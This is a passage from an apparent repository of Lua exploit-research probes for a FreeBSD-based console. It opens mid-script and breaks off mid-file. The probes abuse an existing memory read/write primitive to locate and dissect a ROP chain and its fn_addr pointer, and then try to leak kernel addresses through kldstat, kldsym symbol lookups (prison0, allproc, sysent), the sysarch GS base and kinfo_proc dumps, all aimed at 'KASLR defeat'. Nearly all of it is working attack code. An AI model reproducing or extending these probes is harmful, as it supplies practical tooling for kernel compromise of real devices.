-- STEP 1: Get module bases (need libkernel base for fn_addr calc)
--------------------------------------------------------------------
print("--- STEP 1: MODULE BASES ---")

local info_buf = memory.alloc(0x200)
local modules = {}

for handle = 0, 10 do
    for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
    safe_wd(info_buf, 0x160)
    local ok = pcall(function() sc_dynlib_get_info(uint64(handle), info_buf) end)
    if not ok then break end

    local text_lo = safe_rd(info_buf + 0x108)
    local text_hi = safe_rd(info_buf + 0x10C)
    local text_sz = safe_rd(info_buf + 0x110)
    if text_lo and text_lo > 0 then
        modules[#modules + 1] = {
            h = handle,
            base_lo = text_lo, base_hi = text_hi or 0,
            size = text_sz or 0
        }
        print(string.format("  h=%d base=0x%X%08X size=0x%X",
            handle, text_hi or 0, text_lo, text_sz or 0))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: GPU mmap + find ropchain (same as 41z)
--------------------------------------------------------------------
print("--- STEP 2: FIND ROPCHAIN ---")

-- GPU mmap
local gpu_addr = nil
pcall(function()
    gpu_addr = memory.alloc(0)  -- dummy to get near current heap
end)

local sc_mmap = make_syscall(477)
local gpu_map = nil
pcall(function()
    gpu_map = sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
        uint64(0x1002), uint64("0xFFFFFFFF"), uint64(0))
end)

if not gpu_map then
    print("GPU mmap failed")
    return
end
print("gpu_map: " .. qw_hex(gpu_map))

-- Find ropchain by parsing syscall.pipe string representation
local pipe_str = tostring(syscall.pipe)
print("pipe repr length: " .. #pipe_str)

-- Extract key addresses from the pipe object
-- The ropchain info is embedded in the metatable/closure
-- From 41z: we found it by scanning heap pages before gpu_map

-- Scan backward from gpu_map for the ropchain signature
-- The ropchain has a distinctive pattern: sequences of gadget addresses
-- that are all within the eboot or libkernel range

local PAGE = 0x4000
local eboot_base_lo = modules[1] and modules[1].base_lo or 0
local eboot_base_hi = modules[1] and modules[1].base_hi or 0

print(string.format("eboot base: 0x%X%08X", eboot_base_hi, eboot_base_lo))

-- The chain is ~145 pages before GPU map (from 41z)
-- Scan a range around that
local chain_found = false
local chain_addr = nil
local fn_addr_ptr = nil

for page_back = 130, 160 do
    local scan_base = gpu_map - (page_back * PAGE)
    -- Look for a sequence of eboot-range pointers (ROP gadgets)
    local eboot_ptrs = 0
    for off = 0, 0x100, 8 do
        local q = safe_rq(scan_base + off)
        if q then
            local _, qh, ql = qw_hex(q)
            -- Check if this looks like an eboot address
            if qh == eboot_base_hi then
                local offset_in_eboot = ql - eboot_base_lo
                if offset_in_eboot >= 0 and offset_in_eboot < 0x500000 then
                    eboot_ptrs = eboot_ptrs + 1
                end
            end
        end
    end
    if eboot_ptrs >= 5 then
        print(string.format("  page -%d (0x%X back): %d eboot ptrs — CHAIN?",
            page_back, page_back * PAGE, eboot_ptrs))
        chain_addr = scan_base
        chain_found = true
        break
    end
end

if not chain_found then
    -- Try wider range
    for page_back = 100, 200 do
        local scan_base = gpu_map - (page_back * PAGE)
        local eboot_ptrs = 0
        for off = 0, 0x200, 8 do
            local q = safe_rq(scan_base + off)
            if q then
                local _, qh, ql = qw_hex(q)
                if qh == eboot_base_hi then
                    local offset_in_eboot = ql - eboot_base_lo
                    if offset_in_eboot >= 0 and offset_in_eboot < 0x500000 then
                        eboot_ptrs = eboot_ptrs + 1
                    end
                end
            end
        end
        if eboot_ptrs >= 3 then
            print(string.format("  page -%d: %d eboot ptrs", page_back, eboot_ptrs))
            if not chain_found then
                chain_addr = scan_base
                chain_found = true
            end
        end
    end
end

if not chain_found then
    print("chain not found")
    print("=== PROBE 42h INCOMPLETE ===")
    return
end
print("chain candidate: " .. qw_hex(chain_addr))
print("")

--------------------------------------------------------------------
-- STEP 3: Map the chain structure
-- From 41z: the chain has arg slots and fn_addr
-- Dump the chain region to identify the current syscall setup
--------------------------------------------------------------------
print("--- STEP 3: CHAIN DUMP ---")

-- Dump 512 bytes of the chain
for off = 0, 0x1F8, 8 do
    local q = safe_rq(chain_addr + off)
    if q then
        local hex, qh, ql = qw_hex(q)
        local tag = ""
        if qh == eboot_base_hi then
            local eoff = ql - eboot_base_lo
            if eoff >= 0 and eoff < 0x500000 then
                tag = string.format(" eboot+0x%X", eoff)
            end
        end
        -- Check for libkernel addresses (handle 1 typically)
        if #modules >= 2 then
            local lk = modules[2]
            if qh == lk.base_hi then
                local loff = ql - lk.base_lo
                if loff >= 0 and loff < lk.size then
                    tag = string.format(" libkernel+0x%X", loff)
                end
            end
        end
        -- Check for heap pointers (argument slot data addresses)
        if qh >= 1 and qh <= 5 then tag = " <heap?>" end
        if qh == 0 and ql > 0x10000 and ql < 0x100000 then tag = " <low>" end

        print(string.format("  +0x%03X: %s%s", off, hex, tag))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 4: Find fn_addr specifically
-- fn_addr is a heap pointer that holds the actual function address
-- to call. When we do make_syscall(20) for getpid, it should
-- contain the libkernel syscall stub address.
--------------------------------------------------------------------
print("--- STEP 4: IDENTIFY FN_ADDR ---")

-- Trigger a getpid to "prime" the chain, then immediately scan
-- The chain is set up fresh each call, so we need to catch it
-- between setup and execution.
-- Actually from 41z: the chain persists after the call returns!
-- It's set up, used, and left in memory.

-- Do a getpid to ensure the chain is populated
pcall(function() sc_getpid() end)

-- Now scan the chain region for the libkernel stub address
-- From 41v: the stub is at libkernel+0xB57
if #modules >= 2 then
    local lk = modules[2]
    local stub_lo = lk.base_lo + 0xB57
    local stub_hi = lk.base_hi

    print(string.format("looking for stub at 0x%X%08X (libkernel+0xB57)",
        stub_hi, stub_lo))

    -- Scan chain region for this value (it's stored at fn_addr pointer target)
    -- fn_addr itself is a pointer TO the location holding the stub address
    for off = 0, 0x400, 8 do
        local q = safe_rq(chain_addr + off)
        if q then
            local _, qh, ql = qw_hex(q)
            if qh == stub_hi and ql == stub_lo then
                print(string.format("  FOUND stub at chain+0x%03X", off))
            end
            -- Also check if this qword POINTS to the stub
            -- (fn_addr is an indirect pointer)
            if qh >= 1 and qh <= 5 then
                -- This could be a heap pointer — dereference it
                local target = safe_rq(q)
                if target then
                    local _, th, tl = qw_hex(target)
                    if th == stub_hi and tl == stub_lo then
                        print(string.format("  fn_addr at chain+0x%03X -> %s -> stub",
                            off, qw_hex(q)))
                        fn_addr_ptr = q
                    end
                end
            end
        end
    end

    -- Also scan wider area
    if not fn_addr_ptr then
        print("scanning wider...")
        for off = -0x400, 0x800, 8 do
            local scan_addr = chain_addr + off
            local q = safe_rq(scan_addr)
            if q then
                local _, qh, ql = qw_hex(q)
                if qh >= 1 and qh <= 5 then
                    local target = safe_rq(q)
                    if target then
                        local _, th, tl = qw_hex(target)
                        if th == stub_hi and tl == stub_lo then
                            print(string.format("  fn_addr at offset %d -> %s -> stub",
                                off, qw_hex(q)))
                            fn_addr_ptr = q
                        end
                    end
                end
            end
        end
    end
end

if fn_addr_ptr then
    print("fn_addr pointer: " .. qw_hex(fn_addr_ptr))
    local current = safe_rq(fn_addr_ptr)
    if current then
        print("current value: " .. qw_hex(current))
    end
else
    print("fn_addr not found by stub search")
    print("dumping all heap-range pointers and their targets:")
    for off = 0, 0x400, 8 do
        local q = safe_rq(chain_addr + off)
        if q then
            local _, qh, ql = qw_hex(q)
            if qh >= 1 and qh <= 5 then
                local target = safe_rq(q)
                if target then
                    local _, th, tl = qw_hex(target)
                    local tag = ""
                    if th == eboot_base_hi then
                        local eoff = tl - eboot_base_lo
                        if eoff >= 0 and eoff < 0x500000 then
                            tag = string.format(" eboot+0x%X", eoff)
                        end
                    end
                    if #modules >= 2 then
                        local lk = modules[2]
                        if th == lk.base_hi then
                            local loff = tl - lk.base_lo
                            if loff >= 0 and loff < lk.size then
                                tag = string.format(" lk+0x%X", loff)
                            end
                        end
                    end
                    print(string.format("  chain+0x%03X: %s -> %s%s",
                        off, qw_hex(q), qw_hex(target), tag))
                end
            end
        end
    end
end

print("")
print("=== PROBE 42h COMPLETE ===")
```

## probes/42i_chain_analysis.lua

```lua
-- CRASH_CLASS: SAFE (read-only chain analysis)
-- PROBE 42i: detailed ropchain structure analysis
--
-- 42h2's slot mapping was wrong (used fixed stride from 41z).
-- This probe dumps the ENTIRE chain and identifies the actual
-- argument data pointers by matching the gadget pattern:
--   pop rax -> address loaded into rax
--   mov rax,[rax] -> dereference to get value
--   pop rdi -> destination address
--   mov [rdi],rax -> write value to destination
--
-- The chain is ~0x300 bytes. Each arg load uses ~0x30-0x40 bytes.

print("=== PROBE 42i: CHAIN STRUCTURE ANALYSIS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_mmap = make_syscall(477)
local sc_getpid = make_syscall(20)
local sc_dynlib_get_info = make_syscall(593)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

-- Get addresses
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local ret_str = pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")

if not rop_str then
    print("cannot find ropchain")
    print("first 300 chars: " .. pipe_str:sub(1, 300))
    return
end

local rop_base = uint64(rop_str)
local fn_ptr = fn_str and uint64(fn_str) or nil

print("ropchain: " .. rop_str)
print("fn_addr ptr: " .. (fn_str or "nil"))
print("ret_addr ptr: " .. (ret_str or "nil"))

-- Get eboot base
local info = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do safe_wd(info + off, 0) end
safe_wd(info, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info) end)
local eb_lo = safe_rd(info + 0x108)
local eb_hi = safe_rd(info + 0x10C)
print(string.format("eboot: 0x%X%08X", eb_hi, eb_lo))

-- GPU mmap for heap access
local gpu
pcall(function()
    gpu = sc_mmap(uint64(0), uint64(512 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64("0xFFFFFFFF"), uint64(0))
end)
if not gpu then print("GPU FAILED"); return end
print("GPU: " .. qw_hex(gpu))

-- Verify ropchain is readable
local test = safe_rq(rop_base)
if not test then print("ropchain NOT readable"); return end
print("")

-- Prime the chain with a getpid
pcall(function() sc_getpid() end)

--------------------------------------------------------------------
-- STEP 1: Dump entire chain (0x300 bytes)
--------------------------------------------------------------------
print("--- STEP 1: FULL CHAIN DUMP ---")

for off = 0, 0x2F8, 8 do
    local q = safe_rq(rop_base + off)
    if q then
        local hex, qh, ql = qw_hex(q)
        local tag = ""
        -- Eboot gadget?
        if qh == eb_hi then
            local eoff = ql - eb_lo
            if eoff >= 0 and eoff < 0x500000 then
                tag = string.format(" G:eboot+0x%X", eoff)
            end
        end
        -- Heap pointer? (in the 0x3_xxxxxxxx range near ropchain)
        local _, rh, rl = qw_hex(rop_base)
        if qh == rh and ql >= rl - 0x100000 and ql <= rl + 0x100000 then
            tag = tag .. " H:near_chain"
            -- Dereference to see what it points to
            local target = safe_rq(q)
            if target then
                local _, th, tl = qw_hex(target)
                local ttag = ""
                if th == eb_hi then
                    local eoff = tl - eb_lo
                    if eoff >= 0 and eoff < 0x500000 then
                        ttag = string.format("=eboot+0x%X", eoff)
                    end
                end
                tag = tag .. " *=" .. qw_hex(target) .. ttag
            end
        end
        print(string.format("  +0x%03X: %s%s", off, hex, tag))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: Also dump fn_addr region
--------------------------------------------------------------------
print("--- STEP 2: FN_ADDR REGION ---")

if fn_ptr then
    for off = -0x20, 0x30, 8 do
        local addr = fn_ptr + off
        local q = safe_rq(addr)
        if q then
            local hex, qh, ql = qw_hex(q)
            local tag = ""
            if off == 0 then tag = " <-- fn_addr" end
            print(string.format("  fn%+3d: %s%s", off, hex, tag))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 3: Parse the pipe string for more detail
-- The tostring output has structured info about the chain layout
--------------------------------------------------------------------
print("--- STEP 3: PIPE STRING PARSE ---")

-- Print key sections of the pipe string (avoid binary)
local lines = {}
for line in pipe_str:gmatch("[^\n]+") do
    -- Only print lines with readable ASCII
    local printable = true
    for i = 1, math.min(#line, 200) do
        local b = string.byte(line, i)
        if b < 32 or b > 126 then printable = false; break end
    end
    if printable and #line > 0 then
        lines[#lines + 1] = line
    end
end

print("pipe string (" .. #lines .. " printable lines):")
for i, line in ipairs(lines) do
    if i <= 50 then
        print("  " .. line:sub(1, 120))
    end
end

print("")
print("=== PROBE 42i COMPLETE ===")
```

## probes/phase10_untested_theories/43a_kldstat_kaslr.lua

```lua
-- CRASH_CLASS: MODERATE (probing kldstat with safe struct)
-- PROBE 43a: kldstat via make_syscall — KASLR defeat
--
-- FreeBSD standard kldstat syscall is 308 (306 is kldfind, 307 is kldnext).
-- Probe 02 mapped 367 in its resolve table. This probe tests BOTH 308 and 367.
--
-- kldstat returns struct kld_file_stat which contains:
--   int      version   (+0x00, set to sizeof(struct kld_file_stat))
--   char     name[64]  (+0x04)
--   int      refs      (+0x44)
--   int      id        (+0x48)
--   void*    address   (+0x50) *** KERNEL BASE ADDRESS ***
--   size_t   size      (+0x58)
--
-- fileid 1 = the kernel itself. If address field leaks, KASLR is dead.

print("=== PROBE 43a: KLDSTAT KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) kldstat — kernel module info
-- int kldstat(int fileid, struct kld_file_stat *stat)
-- Note: Standard FreeBSD syscall number is 308. Sweep 02 mapped 367.
-- We test both 308 and 367 to ensure coverage.
--------------------------------------------------------------------
print("")
print("=== A: KLDSTAT (testing syscalls 308 and 367) ===")
do
    local stat_buf = memory.alloc(0x100)

    for _, sc_num in ipairs({308, 367}) do
        print(string.format("--- Testing kldstat as syscall %d ---", sc_num))
        local sc_kldstat = make_syscall(sc_num)

        for fileid = 1, 3 do
            for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
            safe_wd(stat_buf, 0x70) -- 112 bytes

            local ok, ret = pcall(function()
                return sc_kldstat(uint64(fileid), uint64(stat_buf))
            end)
            local rv = ok and to_num(ret) or -999
            print(string.format("  fileid=%d (sc=%d): ret=%d", fileid, sc_num, rv))

            if rv == 0 then
                local version = safe_rd(stat_buf)
                print(string.format("    version: %d", version or -1))

                local name = ""
                for i = 0, 63 do
                    local b = safe_rb(stat_buf + 4 + i)
                    if b and b > 0 and b < 128 then
                        name = name .. string.char(b)
                    else
                        break
                    end
                end
                print("    name: " .. name)

                local refs = safe_rd(stat_buf + 0x44)
                print(string.format("    refs: %d", refs or -1))

                local id = safe_rd(stat_buf + 0x48)
                print(string.format("    id: %d", id or -1))

                local addr = safe_rq(stat_buf + 0x50)
                if addr then
                    local h, l = get_hi_lo(addr)
                    print(string.format("    address: %08X_%08X", h, l))
                    if h >= 0xFFFF8000 then
                        print("    *** KERNEL ADDRESS LEAKED — KASLR DEFEATED ***")
                    end
                end

                local sz = safe_rq(stat_buf + 0x58)
                if sz then
                    local sh, sl = get_hi_lo(sz)
                    print(string.format("    size: %08X_%08X", sh, sl))
                end
            end
        end

        -- Also try with version = 120 (0x78)
        for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
        safe_wd(stat_buf, 0x78)
        local ok2, ret2 = pcall(function()
            return sc_kldstat(uint64(1), uint64(stat_buf))
        end)
        local rv2 = ok2 and to_num(ret2) or -999
        print(string.format("  fileid=1 version=120 (sc=%d): ret=%d", sc_num, rv2))
        if rv2 == 0 then
            local addr = safe_rq(stat_buf + 0x50)
            if addr then
                local h, l = get_hi_lo(addr)
                print(string.format("    address: %08X_%08X", h, l))
            end
        end
    end
end

--------------------------------------------------------------------
-- B) kldnext(0) — get first module fileid, then enumerate
-- int kldnext(int fileid) — returns next fileid, 0 = end
--------------------------------------------------------------------
print("")
print("=== B: KLDNEXT (syscall 307) ===")
do
    local sc_kldnext = make_syscall(307)
    local fileid = 0
    local count = 0
    repeat
        local ok, ret = pcall(function()
            return sc_kldnext(uint64(fileid))
        end)
        local rv = ok and to_num(ret) or -999
        if rv <= 0 or rv == 0xFFFFFFFF then
            print(string.format("  kldnext(%d) = %d (end/error)", fileid, rv))
            break
        end
        print(string.format("  kldnext(%d) = %d", fileid, rv))
        fileid = rv
        count = count + 1
    until count > 20
    print("  modules found: " .. count)
end

--------------------------------------------------------------------
-- C) kldfirstmod — get first module in a kld file
-- int kldfirstmod(int fileid) — returns modid
--------------------------------------------------------------------
print("")
print("=== C: KLDFIRSTMOD (syscall 309) ===")
do
    local sc_kldfirstmod = make_syscall(309)
    local ok, ret = pcall(function()
        return sc_kldfirstmod(uint64(1))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  kldfirstmod(1) = %d", rv))
end

print("")
print("=== PROBE 43a COMPLETE ===")
```

## probes/phase10_untested_theories/43b_kldsym_resolve.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 43b: kldsym(337) via make_syscall — resolve kernel symbols
--
-- kldsym resolves a kernel symbol by name and returns its address.
-- This is the kernel's dlsym(). If it works, we can look up ANY
-- kernel function or variable by name.
--
-- int kldsym(int fileid, int cmd, void *data)
--   cmd = 1 (KLDSYM_LOOKUP)
--   data = struct kld_sym_lookup {
--     int      version;    // sizeof(struct kld_sym_lookup) = 32
--     char    *symname;    // pointer to symbol name string
--     u_long   symvalue;   // OUTPUT: symbol address
--     size_t   symsize;    // OUTPUT: symbol size
--   }

print("=== PROBE 43b: KLDSYM KERNEL SYMBOL RESOLVE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local KLDSYM_LOOKUP = 1

-- Helper: write a C string to a buffer
local function write_str(buf, str)
    for i = 1, #str do
        memory.write_byte(buf + (i-1), string.byte(str, i))
    end
    memory.write_byte(buf + #str, 0)
end

--------------------------------------------------------------------
-- Try resolving key kernel symbols
--------------------------------------------------------------------
local sc_kldsym = make_syscall(337)

local symbols = {
    "prison0",          -- root jail — credential base
    "allproc",          -- linked list of all processes
    "kernel_pmap",      -- kernel page map
    "copyin",           -- copyin function address
    "copyout",          -- copyout function address
    "rootvnode",        -- root filesystem vnode
    "sysent",           -- syscall table
    "kern_securelevel", -- securelevel variable
    "printf",           -- basic kernel function (good test)
    "bzero",            -- another basic one
}

local name_buf = memory.alloc(128)
-- struct kld_sym_lookup: version(4) + pad(4) + symname(8) + symvalue(8) + symsize(8) = 32
local lookup_buf = memory.alloc(64)

print("")
print("=== KLDSYM LOOKUPS (fileid=1, cmd=KLDSYM_LOOKUP) ===")
for _, sym in ipairs(symbols) do
    -- Zero the struct
    for off = 0, 56, 4 do safe_wd(lookup_buf + off, 0) end

    -- Write version = sizeof(struct kld_sym_lookup) = 32
    safe_wd(lookup_buf, 32)

    -- Write symname pointer at +8
    write_str(name_buf, sym)
    safe_wq(lookup_buf + 8, uint64(name_buf))

    local ok, ret = pcall(function()
        return sc_kldsym(uint64(1), uint64(KLDSYM_LOOKUP), uint64(lookup_buf))
    end)
    local rv = ok and to_num(ret) or -999

    if rv == 0 then
        -- Read symvalue at +16
        local symval = safe_rq(lookup_buf + 16)
        local symsize = safe_rq(lookup_buf + 24)
        local vh, vl = 0, 0
        if symval then vh, vl = get_hi_lo(symval) end
        local sh, sl = 0, 0
        if symsize then sh, sl = get_hi_lo(symsize) end

        local tag = ""
        if vh >= 0xFFFF8000 then
            tag = " *** KERNEL SYMBOL RESOLVED ***"
        end
        print(string.format("  %-20s = %08X_%08X  size=%08X_%08X%s",
            sym, vh, vl, sh, sl, tag))
    else
        print(string.format("  %-20s : ret=%d (failed)", sym, rv))
    end
end

--------------------------------------------------------------------
-- Also try fileid=0 (any module) in case fileid=1 doesn't work
--------------------------------------------------------------------
print("")
print("=== RETRY WITH fileid=0 (any module) ===")
for _, sym in ipairs({"printf", "copyin", "prison0"}) do
    for off = 0, 56, 4 do safe_wd(lookup_buf + off, 0) end
    safe_wd(lookup_buf, 32)
    write_str(name_buf, sym)
    safe_wq(lookup_buf + 8, uint64(name_buf))

    local ok, ret = pcall(function()
        return sc_kldsym(uint64(0), uint64(KLDSYM_LOOKUP), uint64(lookup_buf))
    end)
    local rv = ok and to_num(ret) or -999
    if rv == 0 then
        local symval = safe_rq(lookup_buf + 16)
        if symval then
            local vh, vl = get_hi_lo(symval)
            print(string.format("  %-20s = %08X_%08X", sym, vh, vl))
        end
    else
        print(string.format("  %-20s : ret=%d", sym, rv))
    end
end

print("")
print("=== PROBE 43b COMPLETE ===")
```

## probes/phase10_untested_theories/43c_sysarch_gsbase.lua

```lua
-- CRASH_CLASS: LOW (GET is read-only), HIGH for SET
-- PROBE 43c: sysarch(165) via make_syscall — GS/FS base read
--
-- sysarch(AMD64_GET_GSBASE) reads the GS base register.
-- On FreeBSD, the kernel uses GS to access curthread — so the
-- GS base is a kernel thread pointer. If it leaks, we get a
-- direct kernel address.
--
-- FreeBSD <machine/sysarch.h> constants:
-- AMD64_GET_FSBASE = 128
-- AMD64_SET_FSBASE = 129
-- AMD64_GET_GSBASE = 130
-- AMD64_SET_GSBASE = 131
-- AMD64_GET_XFPUSTATE = 132
--
-- Probe 42c already tested GET_FSBASE via sysarch and got 0x881068080
-- (userland TCB, not kernel). But GET_GSBASE was NOT tested.
-- The GS base is different from FS base and may point to kernel memory.

print("=== PROBE 43c: SYSARCH GS BASE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local sc_sysarch = make_syscall(165)

--------------------------------------------------------------------
-- A) GET_FSBASE (128) — control: should return userland TCB
--------------------------------------------------------------------
print("")
print("=== A: GET_FSBASE (128) ===")
do
    local buf = memory.alloc(16)
    safe_wq(buf, uint64(0))

    local ok, ret = pcall(function()
        return sc_sysarch(uint64(128), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rq(buf)
    local vh, vl = 0, 0
    if val then vh, vl = get_hi_lo(val) end
    print(string.format("  ret=%d  fsbase=%08X_%08X", rv, vh, vl))
    if vh >= 0xFFFF8000 then
        print("  *** KERNEL ADDRESS IN FSBASE ***")
    else
        print("  (userland — expected)")
    end
end

--------------------------------------------------------------------
-- B) GET_GSBASE (130) — the money shot
--------------------------------------------------------------------
print("")
print("=== B: GET_GSBASE (130) ===")
do
    local buf = memory.alloc(16)
    safe_wq(buf, uint64(0))

    -- AMD64_GET_GSBASE is 130 (129 is AMD64_SET_FSBASE!)
    local ok, ret = pcall(function()
        return sc_sysarch(uint64(130), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rq(buf)
    local vh, vl = 0, 0
    if val then vh, vl = get_hi_lo(val) end
    print(string.format("  ret=%d  gsbase=%08X_%08X", rv, vh, vl))
    if vh >= 0xFFFF8000 then
        print("  *** KERNEL THREAD POINTER LEAKED ***")
        print("  GS base points to curthread in kernel memory")
        print("  From curthread: +0x0 = td_lock, +0x28 = td_proc,")
        print("  +0x40 = td_ucred, etc.")
    elseif rv == 0 and (vh > 0 or vl > 0) then
        print("  non-zero value — analyze further")
    else
        print("  zero or failed")
    end
end

--------------------------------------------------------------------
-- C) Try other sysarch ops (some may leak info)
-- AMD64_GET_XFPUSTATE = 132
--------------------------------------------------------------------
print("")
print("=== C: OTHER SYSARCH OPS ===")
do
    local buf = memory.alloc(0x100)
    local ops = {
        {num = 129, name = "AMD64_SET_FSBASE (skip — sets base)"},
        {num = 131, name = "AMD64_SET_GSBASE (skip — dangerous)"},
        {num = 132, name = "AMD64_GET_XFPUSTATE"},
    }

    for _, op in ipairs(ops) do
        if op.num == 129 or op.num == 131 then
            print(string.format("  %d %s", op.num, op.name))
        else
            for off = 0, 0xFC, 4 do safe_wd(buf + off, 0) end
            -- For XFPUSTATE, arg is struct { void *addr; int len; }
            local xfpu_buf = memory.alloc(0x200)
            safe_wq(buf, uint64(xfpu_buf))
            safe_wd(buf + 8, 0x200)

            local ok, ret = pcall(function()
                return sc_sysarch(uint64(op.num), uint64(buf))
            end)
            local rv = ok and to_num(ret) or -999
            print(string.format("  %d %s: ret=%d", op.num, op.name, rv))

            if rv == 0 then
                -- Dump first 64 bytes looking for kernel ptrs
                for off = 0, 56, 8 do
                    local q = safe_rq(xfpu_buf + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 then
                            print(string.format("    +%02X: %08X_%08X KPTR!", off, h, l))
                        end
                    end
                end
            end
        end
    end
end

print("")
print("=== PROBE 43c COMPLETE ===")
```

## probes/phase10_untested_theories/43d_kinfo_proc_full.lua

```lua
-- CRASH_CLASS: LOW (sysctl read only)
-- PROBE 43d: Full kern.proc.pid dump — every byte of kinfo_proc
--
-- Previous probes only sampled every 8th qword (8 of ~137 qwords).
-- FreeBSD kinfo_proc (1096 bytes) contains:
--   ki_paddr (+0x00 or +0x08) — struct proc* in kernel memory
--   ki_addr  — struct user*
--   ki_tracep / ki_textvp — vnode pointers
--   ki_fd    — filedesc table pointer
--   ki_vmspace — vmspace pointer
--
-- If ANY of these leak, we have a kernel address.

print("=== PROBE 43d: FULL KINFO_PROC DUMP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Dump ALL 1096 bytes of kern.proc.pid
